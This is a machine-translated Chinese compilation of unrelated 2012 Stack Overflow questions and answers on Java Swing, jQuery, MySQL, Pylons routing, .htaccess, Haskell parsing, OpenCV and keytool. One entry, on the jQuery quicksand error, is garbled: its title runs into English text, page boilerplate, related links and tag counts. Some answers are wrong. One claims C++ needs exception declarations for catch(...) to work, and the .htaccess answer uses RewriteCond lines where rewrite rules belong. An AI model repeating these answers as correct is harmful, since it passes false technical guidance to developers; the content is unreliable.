2） getButtonClicks()：获取所有实例的点击次数

更好的方法是扩展 JButton 以创建您自己的自定义按钮，然后您可以将这些方法添加到按钮本身而不是 ButtonListener。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:59:46.910

如果你想计算一个按钮被按下的次数，那么你需要一个 ActionListener。这是一个例子：

```
public class IListen implements ActionListener
{
    int hits = 0;
    public IListen()
    {
        JFrame frame = new JFrame("Title");
        JPanel panel = new JPanel();
        JButton button = new JButton("hello!");
        button.addActionListener(this);
        panel.add(button);
        frame.add(panel);
        frame.setSize(200,200);
        frame.setVisible(true);
    }

    @Override
    public void actionPerformed(ActionEvent e)
    {
         JButton source = e.getSource();
         if(source == button)
            hits++;

        System.out.println("you hit my button "+hits+" times!");
    }

    public static void main(String args[])
    {
        new IListen();
    }
} 
```

如果有语法错误，我还没有编译我自己很抱歉，希望这会帮助你并扩大你的编程能力。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T18:24:36.010

做你想做的事你需要知道的一切都在[这里](http://docs.oracle.com/javase/tutorial/uiswing/)。如果您花费数周时间来完成这么多工作，那么通读本教程对您将是非常有益的。

# jquery - 将值作为数组附加到 div - jquery

> ID：10338495
> 
> 赞同：0
> 
> 时间：2012-04-26T17:34:07.837
> 
> 标签：jquery

我有一个菜单。这些菜单包括一些艺术家，当管理员单击复选框时，艺术家被插入到数据库中。

首先，

```
function AddDataImdb(par, par2, par3) {

    var artistIds = [];
    $("input[name='" + par + "']:checked").each(function () {
        artistIds.push($(this).val());
    });

    $.post('/json/management/AddDataImdbAjax', {
        "artistIds": artistIds
    }, function (response) {
        if (response == 'error') {

            alert("Sanatçı bulunamadı, yönlendiriliyorsunuz");
            window.location.replace("myurl");

        } else {
            alert("succesfully added");
            $("#" + par2 + "").append(('<br /><input type="checkbox" name =' + par + ' value=' + response + ' />' + par3 + '<br />'));
        }
    });

} 
```

使用上面的代码，我可以添加我的 div 新添加的艺术家。

问题是当管理员插入 2 个或更多艺术家时，它显示最后一个添加

```
$("#"+par2+"").append(('<br /><input type="checkbox" name ='+par+' value='+response+' />'+par3+'<br />')); 
```

上面的代码添加了 div。我怎样才能将这些添加为数组？我能做些什么 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:43:34.640

你能说更多吗？响应的内容是什么？

如果您的回复是一个列表，那么您可以这样做：

```
$.each(reponse, function () {
    //append as div
}): 
```

# google-app-engine - Fusion Table 和 Google 服务帐号

> ID：10338497
> 
> 赞同：6
> 
> 时间：2012-04-26T17:34:15.200
> 
> 标签：google-app-engine, google-fusion-tables

我正在尝试使用 Google 服务帐户从我的 AppENgine Java 应用程序访问 Fusion 表。此代码段用于获取 OAuth 访问令牌：

```
 ArrayList<String> scopes = new ArrayList<String>();
 scopes.add("https://www.googleapis.com/auth/fusiontables");
 DataAccessService fusionTablesService = EnvironmentServic.getEnvironmentService().getService(DataAccessService.class);
 String token = AppIdentityServiceFactory.getAppIdentityService().getAccessToken(scopes).getAccessToken(); 
```

我能够成功获得访问令牌，但是当我尝试执行 CREATE TABLE 查询时，我得到了：

```
 <HTML>
    <HEAD>
     <TITLE>Login required</TITLE>
    </HEAD>
    <BODY BGCOLOR="#FFFFFF" TEXT="#000000">
     <H1>Login required</H1>
     <H2>Error 401</H2>
    </BODY>
   </HTML> 
```

服务帐户是否适用于 Fusion Tables？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T17:08:55.800

我对 Fusion Tables 不是很熟悉，但您可能需要：

1) 授予服务帐户（在管理控制台中找到“电子邮件地址”）访问表的权限。这可能会通过[https://developers.google.com/appengine/articles/prediction_service_accounts](https://developers.google.com/appengine/articles/prediction_service_accounts)上的示例作为此过程的起点可能会有所帮助。

2) 登录有权访问表（或您尝试访问其数据）的用户，并让他们使用三足 OAuth 流授权访问应用程序。如果您正在访问最终用户拥有的数据（例如：joe@gmail.com），那么您可能需要这样做。

希望这可以帮助。

# c++ - boost::math::pdf(distribution, value) 每次调用时是否使用查找表或计算 exp()？

> ID：10338498
> 
> 赞同：0
> 
> 时间：2012-04-26T17:34:24.563
> 
> 标签：c++, boost

我正在研究一种需要高斯函数和大量循环的算法。
Boost::math::pdf 具有我需要实现的正确公式。

我正在使用 boost::math::normal_distribution normal_distribution(0,sigma) 创建一个正态分布，其中平均值始终为零，并且在调用函数时，sigma 可以在不同时间变化。

然后我想在我的循环中使用函数 boost::math::pdf( normal_distribution , dsitance_from_mean ) 以避免用我自己的查找表重新发明轮子。我通读了 boost 文档来寻找这个答案，但我不太清楚这个函数是如何工作的。

pdf 函数是使用正态分布生成的查找表，还是每次调用时都会计算指数值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:54:31.487

我的期望是 Boost 作者会优先考虑准确性而不是性能。

浏览我安装的版本的源代码，我看到很多对 trig/log/exp 函数的调用，没有类似查找表或插值的东西，所以我认为它每次都调用 exp()。

我建议您自己对其进行基准测试，以查看 Boost 代码是否真的是性能瓶颈，然后再实施您自己的查找表。

# jquery - Jquery插件在函数中不可用？

> ID：10338505
> 
> 赞同：0
> 
> 时间：2012-04-26T17:34:45.763
> 
> 标签：jquery

我正在尝试使用以下代码将经度和纬度数据加载到 cookie 中：

```
$.cookie('test', 'test');
var test = true;

function PageLoaded() {
    if (test) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(success_handler, error_handler, {
                enableHighAccuracy: true
            });
            test = false;
        }
    }
}

function success_handler(position) {
    latitude = position.coords.latitude;
    longitude = position.coords.longitude;
    accuracy = position.coords.accuracy;
    document.getElementById("tbLat").value = latitude;
    document.getElementById("tbLon").value = longitude;
    $.cookie('Latitude', latitude);
    $.cookie('Longitude', longitude);

}

function error_handler() {
    document.write('This browser does not support location awareness or you have declined to allow it to view your location.');
} 
```

我正在加载 JQuery.Cookie.js 插件。第一个cookie“测试”正确加载，但后两个“纬度和经度”抛出错误

> 对象不支持属性或方法“cookie”

为什么是这样？

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-04-26T17:38:32.303

jQuery 没有`cookie()`函数。您忘记包含 cookie 插件 - [https://github.com/carhartl/jquery-cookie](https://github.com/carhartl/jquery-cookie)

# php - 表格数据计算 - 在表格中间求和

> ID：10338507
> 
> 赞同：1
> 
> 时间：2012-04-26T17:35:02.727
> 
> 标签：php, mysql, model-view-controller, view

考虑一个简单的查询：

`SELECT id, date, hours FROM employees where id=10`

以及以下结果集：

```
id | date     | hours
---------------------
1   4-19-2012   4
1   4-19-2012   2.5
1   4-19-2012   1
1   4-20-2012   2
1   4-20-2012   3 
```

我正在显示结果集的典型 HTML 表格输出，但我想在当天结果下方的一行中显示每日总和。

```
+--------------------------------------+
| David | 4-19-2012 | 4                |
|       | 4-19-2012 | 2.5              |
|       | 4-19-2012 | 1                |
|--------------------------------------|
| TOTAL ............  7.5              |
|--------------------------------------|
| David | 4-20-2012 | 2                |
|       | 4-20-2012 | 1                |
|--------------------------------------|
| TOTAL ............ 3                 |
|--------------------------------------|
| GRAND TOTAL ..........10.5           |
+--------------------------------------+ 
```

处理这个问题的最佳方法是什么？有很多选择。子查询...将PHP代码放在我的视野中...肯定有更好的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:42:16.657

*升级为答案*

`GROUP BY`在 MySQL 中，您可以使用[`WITH ROLLUP`](http://dev.mysql.com/doc/refman/5.0/en/group-by-modifiers.html)修饰符在分组的表中添加额外的汇总行：

> 该`GROUP BY`子句允许将`WITH ROLLUP`额外的行添加到摘要输出中的修饰符。这些行代表更高级别（或超聚合）的汇总操作。`ROLLUP`因此，您可以通过单个查询回答多个分析级别的问题。例如，它可用于为 OLAP（在线分析处理）操作提供支持。

通过您的查询，您可以执行以下操作：

```
SELECT id, date, SUM(hours) AS totalhours
FROM employees
WHERE id = 10
GROUP BY id, date, hours WITH ROLLUP 
```

# c - 为什么调用 _CxxUnhandledExceptionFilter 而不是被 catch(...) 捕获

> ID：10338508
> 
> 赞同：1
> 
> 时间：2012-04-26T17:35:08.373
> 
> 标签：c, exception, visual-studio-2005

我在 msvcrt 上遇到过这个问题，msvcr80.dll 也没有。_CxxThrowException 将进入未处理的异常过滤器。

不应该 catch(...) 抓住这个？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:42:46.150

C++ 要求您的方法/函数定义准确地声明它可以抛出什么以允许 catch(...) 工作。我知道这似乎很疯狂，包罗万象的模型实际上并没有达到您的预期，但这是设计使然

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T19:18:36.047

A`_CxxThrowException`是 Microsoft 特定的低级事物（注意开头的下划线+大写字母）。它不是标准 C++，而是 Microsoft 实现代码，所以我看不出标准 C++ 构造必须对它做任何事情的任何理由。

# python - 塔架通过文件夹路由

> ID：10338509
> 
> 赞同：0
> 
> 时间：2012-04-26T17:35:09.383
> 
> 标签：python, api, routing, versioning, pylons

我对 pylons 有点陌生，我的任务是设计一个 API 版本控制系统。我想将不同版本的 API 存储在不同的文件夹中。例如：

```
controllers/APIVersion/v1/clientAPI.py -- Version 1
controllers/APIVersion/v2/clientAPI.py -- Version 2
controllers/APIVersion/v3/clientAPI.py -- Version 3 
```

访问这些 API 的请求应如下所示：

```
curl 'http://mySite/v1/clientAPI/get/' -- Should bring me to the first version
curl 'http://mySite/v2/clientAPI/get/' -- Should bring me to the second version 
```

我知道我可以通过 routing.py 做到这一点。这是我的第一个想法，但似乎不起作用：

```
map.connect('/APIVersion/{version}/{controller}/{action}') 
```

关于如何路由到所需位置的任何想法？另外，请随时评论我的版本控制方法。我欢迎建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-29T21:15:02.920

Routes 看到的第一件事是 URL（它也是 的第一个参数`connect`）。您正在尝试使用类似的 URL 访问 API，`/v1/clientAPI/get/`但您已经使用类似的路由配置了 routing.py `/APIVersion/{version}/{controller}/{action}`。所以没有匹配。
最简单的“修复”是使用`http://mySite/APIVersion/v1/clientAPI/get/`v1 或`http://mySite/APIVersion/v2/clientAPI/get/`v2 等 URL（您还需要确保 APIVersion 和所有 v1 到 vX 都是包 + 每个中的控制器类都`clientAPI.py`被调用`ClientapiController`）。
如果这不是一个选项（因为您仍然想使用类似的 URL，`/v1/clientAPI/get/`但具有类似的控制器目录布局`/APIVersion/v1/clientAPI/get/`），那么您将需要使用类似于[此处](http://wiki.pylonshq.com/display/pylonscookbook/routes+-+dynamic+controllers)列出的方法。

# .htaccess - htaccess 用 godaddy 重写

> ID：10338511
> 
> 赞同：1
> 
> 时间：2012-04-26T17:35:16.080
> 
> 标签：.htaccess, mod-rewrite

尝试我的 .htaccess 页面重写此 url

```
www.mywebsite.com/view.php?2012/this-is-page.html 
```

到

```
www.mywebsite.com/view.php/2012/this-is-page.html 
```

“view.php”是模板......我只是不喜欢“view.php”？

终于让这个 CMS 使用“？” 在“view.php”而不是“/”之后——现在，我如何让它在浏览器 URL 窗口中重写它？

到目前为止，我有：

```
#Fix Rewrite
Options -Multiviews

RewriteEngine on 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:51:33.780

通过启用 mod_rewrite 和 .htaccess `httpd.conf`，然后将此代码放在您`.htaccess`的`DOCUMENT_ROOT`目录下：

```
Options +FollowSymLinks -MultiViews
# Turn mod_rewrite on
RewriteEngine On
RewriteBase /

# external redirect from view.php?2012/this-is-page.html to view/2012/this-is-page.html
RewriteCond %{THE_REQUEST} ^[A-Z]{3,}\s/+view\.php\?([^\s]+) [NC]
RewriteCond ^ view/%1? [L,R]

# internal forward from view/2012/this-is-page.html to view.php?2012/this-is-page.html
RewriteCond ^view/(.+)$ view.php?$1 [L,NC,QSA] 
```

# javascript - Jquery：未捕获的类型错误：对象# has no method 'quicksand' I have running to the exception of "Uncaught TypeError: Object # has no method 'quicksand'", and I can't seem to find where the error is coming from. I am very new to jQuery and Java 问问题 问问题 2012-04-26T17:35:20.683 6303 次 This question shows research effort; it is useful and clear 3 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. I have running to the exception of "Uncaught TypeError: Object # has no method 'quicksand'", and I can't seem to find where the error is coming from. I am very new to jQuery and Java Script, and not sure what is wrong. I am trying the implement the example here: http://www.evoluted.net/thinktank/web-development/jquery-quicksand-tutorial-filtering I took that code, and I ran the the index file, and I can see it working fine, so I just copied the list over and took his main.js content and combine with the one I already have to get this function: $(document).ready(function () { $("#myController").jFlow({ controller: ".jFlowControl", slideWrapper: "#jFlowSlider", slides: "#mySlides", selectedWrapper: "jFlowSelected", width: "960px", height: "350px", duration: 400, prev: ".jFlowPrev", next: ".jFlowNext", auto: true }); $().UItoTop({ easingType: 'easeOutQuart' }); jQuery("a[data-gal^='prettyPhoto']").prettyPhoto({ social_tools: false }); // get the action filter option item on page load var $filterType = $('#filterOptions li.active a').attr('class'); // get and assign the ourHolder element to the // $holder varible for use later var $dataholder = $('ul.ourHolder'); // clone all items within the pre-assigned $holder element var $data = $dataholder.clone(); // attempt to call Quicksand when a filter option // item is clicked $('#filterOptions li a').click(function(e) { // reset the active class on all the buttons $('#filterOptions li').removeClass('active'); // assign the class of the clicked filter option // element to our $filterType variable var $filterType = $(this).attr('class'); $(this).parent().addClass('active'); if ($filterType == 'all') { // assign all li items to the $filteredData var when // the 'All' filter option is clicked var $filteredData = $data.find('li'); } else { // find all li elements that have our required $filterType // values for the data-type element var $filteredData = $data.find('li[data-type=' + $filterType + ']'); } // call quicksand and assign transition parameters $dataholder.quicksand($filteredData, { duration: 800, easing: 'easeInOutQuad', attribute: "data-id", }); return false; }); } ); " But I get an error at : "$dataholder.quicksand($filteredData,duration: 800,easing: 'easeInOutQuad'}); " Any idea what needs to be done? Including a 2nd copy of jQuery results in the previous copy and all of it's plugins being overridden. Removing one of them fixes the problem. javascriptjquery 4 1 回答 1 This answer is useful 4 包含 jQuery 的第二个副本会导致前一个副本和它的所有插件被覆盖。删除其中一个可以解决问题。 于 2012-04-26T19:08:00.707 回答 Related 1 mysql - 警告：PDO::__construct() [pdo.--construct]: MySQL server has gone away ，即使有持久连接 0 php - Wordpress：有没有办法以 TR TD 格式而不是 DIV SPAN 显示帖子 5 shell - 如何在 Jenkins 中以 root 身份运行脚本？ 1 java - Spring AOP - 方法调用（）不会发生 0 c# - 从 Active Directory 获取用户组时出错 1 mysql - 从两个表在 SQL 中生成报告 1 magento - QLSTATE [42S02]：未找到基表或视图：1146 表 'davidso_newmagento.tag' 不存在 1 c# - 如何在 Orchard CMS 数据库中保存自定义数据 1 c++ - 是否可以使用自己编译的 Chromium Embedded 编译 CefSharp？ 1 gwt - 在 Cordova Phonegap 项目中实现 GWT 代码 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：10338513
> 
> 赞同：3
> 
> 时间：
> 
> 标签：javascript, jquery

I have running to the exception of "Uncaught TypeError: Object # has no method 'quicksand'", and I can't seem to find where the error is coming from. I am very new to jQuery and Java Script, and not sure what is wrong.

I am trying the implement the example here: [http://www.evoluted.net/thinktank/web-development/jquery-quicksand-tutorial-filtering](http://www.evoluted.net/thinktank/web-development/jquery-quicksand-tutorial-filtering)

I took that code, and I ran the the index file, and I can see it working fine, so I just copied the list over and took his main.js content and combine with the one I already have to get this function:

```
$(document).ready(function () { 
$("#myController").jFlow({ controller: ".jFlowControl", slideWrapper: "#jFlowSlider", slides: "#mySlides", selectedWrapper: "jFlowSelected", width: "960px", height: "350px", duration: 400, prev: ".jFlowPrev", next: ".jFlowNext", auto: true }); 
$().UItoTop({ easingType: 'easeOutQuart' }); jQuery("a[data-gal^='prettyPhoto']").prettyPhoto({ social_tools: false });
 // get the action filter option item on page load
  var $filterType = $('#filterOptions li.active a').attr('class');
  // get and assign the ourHolder element to the
    // $holder varible for use later
  var $dataholder = $('ul.ourHolder');

  // clone all items within the pre-assigned $holder element
  var $data = $dataholder.clone();

  // attempt to call Quicksand when a filter option
    // item is clicked
    $('#filterOptions li a').click(function(e) {
        // reset the active class on all the buttons
        $('#filterOptions li').removeClass('active');

        // assign the class of the clicked filter option
        // element to our $filterType variable
        var $filterType = $(this).attr('class');
        $(this).parent().addClass('active');

        if ($filterType == 'all') {
            // assign all li items to the $filteredData var when
            // the 'All' filter option is clicked
            var $filteredData = $data.find('li');
        } 
        else {
            // find all li elements that have our required $filterType
            // values for the data-type element
            var $filteredData = $data.find('li[data-type=' + $filterType + ']');
        }

        // call quicksand and assign transition parameters
        $dataholder.quicksand($filteredData, {
            duration: 800,
            easing: 'easeInOutQuad',
            attribute: "data-id",
        });
        return false;
    });
    }
); 
```

" But I get an error at : "$dataholder.quicksand($filteredData,duration: 800,easing: 'easeInOutQuad'}); "

Any idea what needs to be done?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T19:08:00.707

包含 jQuery 的第二个副本会导致前一个副本和它的所有插件被覆盖。删除其中一个可以解决问题。

# php - 如何用 php 中的自定义文本替换一些标签及其内容？

> ID：10338518
> 
> 赞同：0
> 
> 时间：2012-04-26T17:35:40.713
> 
> 标签：php, preg-replace, preg-match, preg-match-all

我有一个字符串，我`preg_match_all`用来在该字符串中查找一些标签：

```
$str = " 
Line 1: This is a string 
Line 2: [img]http://placehold.it/350x150[/img] Should not be [youtube]SDeWJqKx3Y0[/youtube] included."; 

preg_match_all("~\[img](.+?)\[/img]~i", $str, $img);  
preg_match_all("~\[youtube](.+?)\[/youtube]~i", $str, $youtube);

foreach ($img[1] as $key => $value) {
    echo '<img src="'.$value.'" "/>';
}

foreach ($youtube[1] as $key => $value) {
    echo '<iframe width="420" height="315" src="http://www.youtube.com/embed/'.$value.'" frameborder="0" allowfullscreen> </iframe>';
} 
```

这将准确返回与正确值相呼应的内容。

但我真正想要的是返回整个字符串，并将`[img]`and`[youtube]`标记替换为这些 foreach 语句中的值：

```
Line 1: This is a string 
    Line 2: <img src="http://placehold.it/350x150" "/> Should not be <iframe width="420" height="315" src="http://www.youtube.com/embed/SDeWJqKx3Y0" frameborder="0" allowfullscreen> </iframe> included. 
```

我不是在寻找第 3 方替代方案，只是在寻找普通的 php 函数。

我正在考虑使用`preg_match`和一些`case`和`switch`语句，但我还没有成功

一个想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:42:10.650

您可以使用[preg_replace](http://www.php.net/manual/en/function.preg-replace.php)

有了这样的东西。

```
$pattern = Array();
$pattern[0] = "~\[img](.+?)\[/img]~i";
$pattern[1] = "~\[youtube](.+?)\[/youtube]~i";

$replacement = Array();
$replacement[0] = '<img src="${1}" "/>';
$replacement[1] =  '<iframe width="420" height="315" src="http://www.youtube.com/embed/${1}" frameborder="0" allowfullscreen> </iframe>';

$stringToReturn = preg_replace($pattern, $replacement, $str); 
```

# parsing - *** 例外：Prelude.read：Haskell 中没有解析 - 解析、表达式和递归

> ID：10338524
> 
> 赞同：3
> 
> 时间：2012-04-26T17:36:18.373
> 
> 标签：parsing, haskell, expression

这部分代码应该读入两个或多个数字（省略主 io 函数），然后是一个“+”来给出总和。使用有理数是因为稍后我将进行乘法和其他此类操作。

```
data Expression =  Number Rational
               | Add (Expression)(Expression)
               deriving(Show,Eq)

solve :: Expression -> Expression
solve (Add (Number x) (Number y)) = Number (x + y)

parse :: [String] -> [Expression] -> Double
parse ("+":s)(a:b:xs) = parse s (solve (Add a b):xs)
parse [] (answer:xs) = fromRational (toRational (read (show answer)::Float))
parse (x:xs) (y) = parse (xs) ((Number (toRational (read x::Float))):y) 
```

（第二个）错误是解析函数无法处理

```
*Main> parse ["1","2","+"] [Number 3]

*** Exception: Prelude.read: no parse 
```

我已经在 Data.Ratio 页面和网络上查看了这个解决方案，但没有找到它，希望能得到一些帮助。谢谢，

CSJC

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:44:16.147

第一个方程，

```
parse ("+":s)(a:b:xs) = parse (s)((solve (Add (Number a) (Number b))):xs) 
```

应该

```
parse ("+":s)(a:b:xs) = parse (s)((solve (Add a b)):xs) 
```

因为根据类型签名，`a`并且`b`已经是`Expression`s。

**或者**，根据第二个和第三个等式，将类型更改为

```
parse :: [String] -> [Rational] -> Double 
```

并将第一个方程更改为

```
parse ("+":s)(a:b:xs) = parse s ((a + b):xs) 
```

修复代码的两种可能方法（有更多有问题的部分）：

```
-- Complete solve to handle all cases
solve :: Expression -> Expression
solve expr@(Number _) = expr
solve (Add (Number x) (Number y)) = Number (x + y)
solve (Add x y) = solve (Add (solve x) (solve y))

-- Convert an Expression to Double
toDouble :: Expression -> Double
toDouble (Number x) = fromRational x
toDouble e = toDouble (solve e)

-- parse using a stack of `Expression`s
parse :: [String] -> [Expression] -> Double
parse ("+":s) (a:b:xs) = parse s ((solve (Add a b)):xs)
parse [] (answer:_) = toDouble answer
parse (x:xs) ys = parse xs (Number (toRational (read x :: Double)) : ys)
parse _ _ = 0

-- parse using a stack of `Rational`s
parseR :: [String] -> [Rational] -> Double
parseR ("+":s) (a:b:xs) = parseR s (a+b : xs)
parseR [] (answer:xs) = fromRational answer
parseR (x:xs) y = parseR xs ((toRational (read x::Double)):y)
parseR _ _ = 0 
```

后者相当谨慎，因为最终产生了 a ，因此将s 用于堆栈`Double`没有任何意义。`Rational`

在您的代码中`parse`，第三个等式省略了通过构造函数将 a 转换为 a`Rational`的`Expression`过程`Number`，但其他方面都很好。然而，第二个等式包含不同类型的问题：

```
parse [] (answer:xs) = fromRational (toRational (read (show answer)::Float)) 
```

如果`answer`是 an`Expression`或 a `Rational`，`show answer`则不能解析为 a `Float`，因此将导致运行时错误，如您的编辑所示：

> （第二个）错误是解析函数无法处理

```
*Main> parse ["1","2","+"] [Number 3]
*** Exception: Prelude.read: no parse 
```

在使用第二个等式的地方，`answer`堆栈上的第一个元素 ( ) 是`Number (3 % 1)`，并且`show (Number (3 % 1))`是`"Number (3 % 1)"`，它不是`String`可以`read`解析为 a 的 a `Float`。

# ellipsis - 省略号（...）不适用于单个单词

> ID：10338529
> 
> 赞同：0
> 
> 时间：2012-04-26T17:36:21.697
> 
> 标签：ellipsis, tibco-gi

我已将以下样式表设置为文本省略号的通用界面（TIBCO GI）中网格列的值模板

```
white-space:nowrap;text-overflow:ellipsis; 
```

它适用于句子/多个单词。它不适用于单个单词。

请帮我解决这个问题。

-斯里达尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:43:25.283

[jsfiddle](http://jsfiddle.net/ryanwfiorini/CDRfq/)

我只用一个词就能显示省略号。尝试设置溢出：隐藏；。

我确实想补充一点，我没有 TIBCO，所以我无法在那里测试它，但这是它在它之外工作的证明。

# sql - 使用 JMeter 进行负载测试时应用程序中的死锁错误

> ID：10338530
> 
> 赞同：2
> 
> 时间：2012-04-26T17:36:26.657
> 
> 标签：sql, deadlock, jmeter

我正在使用 JMeter 对我的应用程序进行负载测试。

我现在正在创建 2 个线程，它们同时更新数据库（加速期为 0）。但我收到以下错误：

> 事务（进程 ID 62）与另一个进程在锁资源上死锁，并已被选为死锁牺牲品。重新运行事务。

我已经包含了死锁图。
有人对此有任何意见吗？

![死锁图](../Images/421fd5028240d204213dc7b4a24cb2aa.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T19:44:18.290

这与 JMeter 无关。您的应用程序容易出现死锁。

这可能是也可能不是错误。如果您对很少发生死锁感到满意，请不要担心（请注意，收到死锁的请求可能会崩溃）。

如果您对死锁的可能性不满意，这是一个需要修复的错误。您可以在其他地方找到有关执行此操作的信息。

# c# - 无法序列化会话状态

> ID：10338532
> 
> 赞同：0
> 
> 时间：2012-04-26T17:36:39.357
> 
> 标签：c#, asp.net

无法序列化会话状态。在“StateServer”和“SQLServer”模式下，ASP.NET 将序列化会话状态对象，因此不允许不可序列化的对象或 MarshalByRef 对象。如果自定义会话状态存储在“自定义”模式下完成类似的序列化，则适用相同的限制。

> 说明：执行当前 Web 请求期间发生未处理的异常。请查看堆栈跟踪以获取有关错误及其源自代码的位置的更多信息。
> 
> 异常详细信息：System.Web.HttpException：无法序列化会话状态。在“StateServer”和“SQLServer”模式下，ASP.NET 将序列化会话状态对象，因此不允许不可序列化的对象或 MarshalByRef 对象。如果自定义会话状态存储在“自定义”模式下完成类似的序列化，则适用相同的限制。
> 
> 源错误：
> 
> 在执行当前 Web 请求期间生成了未处理的异常。可以使用下面的异常堆栈跟踪来识别有关异常起源和位置的信息。
> 
> 堆栈跟踪：
> 
> [SerializationException：在程序集“App_Code.aw9uvznn，版本=0.0.0.0，Culture=neutral，PublicKeyToken=null”中键入“Examination”未标记为可序列化。]
> System.Runtime.Serialization.FormatterServices.InternalGetSerializableMembers（RuntimeType 类型）+7735723
> System.Runtime.Serialization.FormatterServices.GetSerializableMembers(Type type, StreamingContext context) +258
> System.Runtime.Serialization.Formatters.Binary.WriteObjectInfo.InitMemberInfo() +111 System.Runtime.Serialization.Formatters.Binary.WriteObjectInfo.InitSerialize(Object obj，ISurrogateSelector surrogateSelector，StreamingContext 上下文，SerObjectInfoInit serObjectInfoInit，IFormatterConverter 转换器，ObjectWriter objectWriter) +161
> System.Runtime.Serialization.Formatters.Binary.WriteObjectInfo.Serialize（对象 obj，ISurrogateSelector surrogateSelector，StreamingContext 上下文，SerObjectInfoInit serObjectInfoInit，IFormatterConverter 转换器，ObjectWriter objectWriter）+51
> System.Runtime.Serialization.Formatters.Binary.ObjectWriter.Serialize（对象图, Header[] inHeaders, __BinaryWriter serWriter, Boolean fCheck) +410 System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.Serialize(Stream serializationStream, Object graph, Header[] headers, Boolean fCheck) +134 System.Web.Util。 AltSerialization.WriteValueToStream（对象值，BinaryWriter 写入器）+1577
> 
> [HttpException (0x80004005): 无法序列化会话状态。在“StateServer”和“SQLServer”模式下，ASP.NET 将序列化会话状态对象，因此不允许不可序列化的对象或 MarshalByRef 对象。如果自定义会话状态存储在“自定义”模式下完成类似的序列化，则同样的限制适用。]
> System.Web.Util.AltSerialization.WriteValueToStream(Object value, BinaryWriter writer) +1662
> System.Web.SessionState.SessionStateItemCollection.WriteValueToStreamWithAssert(对象值，BinaryWriter writer）+34
> System.Web.SessionState.SessionStateItemCollection.Serialize（BinaryWriter writer）+606
> System.Web.SessionState.SessionStateUtility.Serialize（SessionStateStoreData item，
> System.Web.SessionState.SessionStateUtility.SerializeStoreData(SessionStateStoreData item, Int32 initialStreamSize, Byte[]& buf, Int32& length) +72
> System.Web.SessionState.OutOfProcSessionStateStore.SetAndReleaseItemExclusive(HttpContext context, String id, SessionStateStoreData item, Object lockId, Boolean newItem）+87
> System.Web.SessionState.SessionStateModule.OnReleaseState（对象源，EventArgs eventArgs）+560
> System.Web.SessionState.SessionStateModule.OnEndRequest（对象源，EventArgs eventArgs）+160
> System.Web.SyncEventExecutionStep.System.Web。 HttpApplication.IExecutionStep.Execute() +68 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously) +75
> 
> * * *

[http://myweb.somee.com/login.aspx](http://myweb.somee.com/login.aspx) 用户名：demo 密码：user

单击参加考试选择 ASP.NET，然后单击开始考试。

您将看到下面的错误。我需要帮助来消除此错误。sidra.raheel@yahoo.com

从以下链接下载源代码： [http ://www.4shared.com/zip/-KF0Zjsi/Quiz_Engine_in_ASP.html](http://www.4shared.com/zip/-KF0Zjsi/Quiz_Engine_in_ASP.html)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-26T17:39:30.927

所以，标记`Examination`为`[Serializable]`。完毕。

# c++ - 从opencv中的像素数组创建矩阵

> ID：10338536
> 
> 赞同：3
> 
> 时间：2012-04-26T17:36:51.537
> 
> 标签：c++, opencv

我有一个无符号短数组，我想使用 opencv 对其进行中值过滤（它似乎是最有效的过滤器之一）

但是我似乎无法从数组中创建矩阵。我已经尝试使用 Mat(int _rows, int _cols, int _type, void* _data, size_t _step=AUTO_STEP) 构造函数：

```
Mat(rows,cols,IPL_DEPTH_16U,myShortArray,2); 
```

但这似乎不起作用。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-26T17:44:51.230

尝试

```
Mat m(rows, cols, CV_16U, myShortArray); 
```

# java - 什么导致 keytool 错误“无法解密安全内容条目”？

> ID：10338543
> 
> 赞同：34
> 
> 时间：2012-04-26T17:38:07.187
> 
> 标签：java, openssl, keytool, pkcs#12, jks

我正在尝试使用以下命令将标准 PKCS #12 (.p12) 密钥库转换为 Java JKS 密钥库：

`keytool -importkeystore -srckeystore keystore.p12 -srcstoretype PKCS12 -deststoretype JKS -destkeystore keystore.jks`

它失败了：

```
keytool error: java.io.IOException: failed to decrypt safe contents entry: javax.crypto.BadPaddingException: Given final block not properly padded 
```

你知道如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2013-12-04T18:45:26.393

有时，此错误是 p12 密钥使用错误密码的症状。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-04-27T10:03:15.877

pkcs12 密钥库确实已损坏。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-04-26T18:05:22.710

我以前从未尝试过这样做，但我确实在 google [here](https://support.comodo.com/index.php?_m=knowledgebase&_a=viewarticle&kbarticleid=1283)上找到了说明。

这个[线程](https://stackoverflow.com/questions/9236939/java-keytool-giving-final-block-not-properly-padded)问了一个类似的问题。

**编辑（基于评论）**

以下是链接参考的完整内容：

PFX/P12 到 JKS（Java 密钥库）

**问题：**如何将证书从 IIS / PFX（.p12 文件）移动到 JKS（Java KeyStore）？
